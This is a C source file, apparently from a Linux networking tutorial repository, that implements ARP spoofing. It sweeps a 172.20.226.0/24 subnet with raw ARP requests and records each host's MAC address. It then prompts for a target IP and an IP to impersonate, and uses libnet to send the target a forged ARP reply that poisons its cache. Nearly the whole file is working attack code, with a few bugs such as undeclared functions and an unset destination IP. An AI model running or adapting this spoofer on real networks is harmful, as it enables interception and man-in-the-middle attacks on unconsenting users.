/*
 * @Author: cpu_code
 * @Date: 2020-05-03 19:23:27
 * @LastEditTime: 2020-05-03 22:06:26
 * @FilePath: \linux_network\introduction\arp\arp_fork.c
 * @Gitee: https://gitee.com/cpu_code
 * @CSDN: https://blog.csdn.net/qq_44226094
 */
#include <stdio.h>
#include <sys/socket.h>
#include <netpacket/packet.h>
#include <net/ethernet.h>
#include <stdlib.h>
#include <strings.h>
#include <pthread.h>
#include <string.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <libnet.h>
#include <unistd.h>

int sockfd = 0;
struct sockaddr_ll sll;

typedef struct arp_link
{
	unsigned char ip[4];
	unsigned char mac[6];
	struct arp_link *next;
}ARP_LINK;

ARP_LINK * head;

int main(int argc, char *argv[])
{
    pthread_t send_id = 0;
	pthread_t get_id = 0;
	pthread_t arp_id = 0;

    sockfd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
    if(sockfd < 0)
	{
		perror("socket");
		exit(-1);
	}
    pthread_create(&send_id, NULL, send_arp_ask, NULL);
	pthread_create(&get_id, NULL, get_arp_answer, NULL);
	pthread_create(&arp_id, NULL, send_arp_req, NULL);

    pthread_join(send_id, NULL);
	pthread_join(get_id, NULL);
	pthread_join(arp_id, NULL);

    return 0;
}

void *send_arp_ask()
{
	
	int i = 0;
	struct ifreq ifr;

	strcpy(ifr.ifr_name, "eth0");    //获得接口号
	ioctl(sockfd, SIOCGIFINDEX, &ifr);

	bzero(&sll, sizeof(sll));
	sll.sll_ifindex = ifr.ifr_ifindex;    // 指定从本机出去的网卡接口

	for(i = 1; i < 255; i++)
	{
		unsigned char ask[] = {
						0xff, 0xff, 0xff, 0xff, 0xff, 0xff,   //aim mac 6  
						0x00, 0x0c, 0x29, 0x1b, 0x22, 0x0a,   //src mac 6
						0x08, 0x06,   //帧类型 2
						0x00, 0x01,   //以太网地址 2
						0x08, 0x00,   //协议类型 2
						6,            //硬件地址长度  1
						4,            //协议地址长度  1
						0x00, 0x01,   //类型 2
						0x00, 0x0c, 0x29, 0x1b, 0x22, 0x0a,   //src mac 6
						172,20,226,3,                        //源ip
						0, 0, 0, 0, 0, 0,                    //aim mac 6
						172, 20, 226, i
		};

		int len = sendto(sockfd, ask, sizeof(ask), 0, (struct sockaddr*)&sll, sizeof(sll));
		if(len < 0)
		{
			perror("sendto");
		}
	}

	return NULL;
}

void *get_arp_answer()
{
	int i = 0;
	
	while(1)
	{
		unsigned char answer[1024] = "";
		ARP_LINK p;
		
		recvfrom(sockfd, answer, sizeof(answer), 0, NULL, NULL);
	
		if((answer[12] == 0x08) && (answer[13] == 0x06))
		{
			if(answer[20] == 0x00 && answer[21] == 0x02)
			{
				memcpy(p.ip, &answer[28], 4);
				memcpy(p.mac, &answer[6], 6);
				
				head = add_arp(head, p); 
				if(answer[31] == 254)
				{
					return NULL;
				}
			}
		}
	}
}

ARP_LINK * add_arp(ARP_LINK *head, ARP_LINK temp)
{
	ARP_LINK *pf = head, *pb = NULL, *pend = NULL;

	while(pf != NULL)
	{
		if(memcmp(pf->ip, temp.ip, 4) == 0)
		{
			return head;
		}
		
		pend = pf;
		pf = pf->next;
	}
	
	pb = (ARP_LINK *)malloc(sizeof(ARP_LINK));
	memcpy(pb->ip, temp.ip, 4);
	memcpy(pb->mac, temp.mac, 6);
	pb->next = NULL;
	
	if(head == NULL)
	{
		head = pb;
	}
	else 
	{
		pend->next = pb;
	}
	
	return head;
}

unsigned char *search_mac(ARP_LINK *head, char *ip)
{

	ARP_LINK * p = 	head;
	while(p != NULL)
	{
		if(memcmp(p->ip, ip, 4) == 0)
		{
			return p->mac;
		}
		p = p->next;
	}
	
	return NULL;
}

void link_print(ARP_LINK * head)
{
	ARP_LINK * p = head;
	
	if(head == NULL)
	{
		printf("in print no user\n");
		return;
	}
	while(p != NULL)
	{
		printf(" %d.%d.%d.%d ------- %02x-%02x-%02x-%02x-%02x-%02x\n",p->ip[0], 
                                                                      p->ip[1], 
                                                                      p->ip[2], 
                                                                      p->ip[3], 
                                                                      p->mac[0], 
                                                                      p->mac[1], 
                                                                      p->mac[2], 
                                                                      p->mac[3], 
                                                                      p->mac[4], 
                                                                      p->mac[5]);
		p = p->next;
	}
	return ;
}

void *send_arp_req()
{
	char aim_ip[16] = "";
	char src_ip[16] = "";
	unsigned char ip_cmp[4] = "";
	char err_buf[100] = "";
	ARP_LINK *p = NULL;
	libnet_t * l = NULL;
	libnet_ptag_t lib_t = 0;
	unsigned long ip_s = 0, ip_d = 0;
	unsigned char *mac = NULL;
	unsigned char buf1[5] = "";
	unsigned char buf2[5] = "";
	unsigned char buf3[5] = "";
	unsigned char buf4[5] = "";
	
	sleep(3);
	
	unsigned char src_mac[6] = {0x00, 0x0c, 0x29, 0x1b, 0x22, 0x0a};//发送者网卡地址
	
	link_print(head);
	
	 while(1)
	 {
		printf("please input the aim ip\n");
		fgets(aim_ip, 16, stdin);
		aim_ip[strlen(aim_ip)-1] = '\0';
		
		printf("please input the ip which you fack\n");
		fgets(src_ip, 16, stdin);
		src_ip[strlen(src_ip)-1] = '\0';
		
		sscanf(aim_ip, "%[^.].%[^.].%[^.].%[^.]", buf1, buf2, buf3, buf4);
		
		ip_cmp[0] = atoi(buf1);
		ip_cmp[1] = atoi(buf2);
		ip_cmp[2] = atoi(buf3);
		ip_cmp[3] = atoi(buf4);
	
		mac = search_mac(head, ip_cmp);
		if(mac == NULL)
		{
			printf("no this ip user\n");
		}
		else
		{
			ip_s = libnet_name2addr4(l, src_ip, LIBNET_RESOLVE);
			
			l = libnet_init(LIBNET_LINK_ADV, "eth0", err_buf);
			if(NULL == l)
			{
				perror("libnet_init");
				exit(-1);
			}
			
			lib_t = libnet_build_arp(
										ARPHRD_ETHER,
										ETHERTYPE_IP,
										6,
										4,
										2,  //ARP应答
										(u_int8_t *)src_mac,
										(u_int8_t *)&ip_s,
										(u_int8_t *)mac,
										(u_int8_t *)&ip_d,
										NULL,
										0,
										l,
										0
									);
									
			lib_t = libnet_build_ethernet(      //create ethernet header
											(u_int8_t *)mac,    //dest mac addr
											(u_int8_t *)src_mac,   //source mac addr
											ETHERTYPE_ARP,   //protocol type
											NULL,   //payload
											0,   //payload length
											l,   //libnet context
											0   //0 to build a new one
										);
			
			int res;
			res = libnet_write(l);
			if(-1 == res)
			{
				printf("libnet_write error!\n");
				exit(-1);
			}
			
			libnet_destroy(l);
			printf("^^^^^^^^^^^^^^^^^^^^^success^^^^^^^^^^^^^^^^^^^^^^^^\n");
		}
	}
	return;
}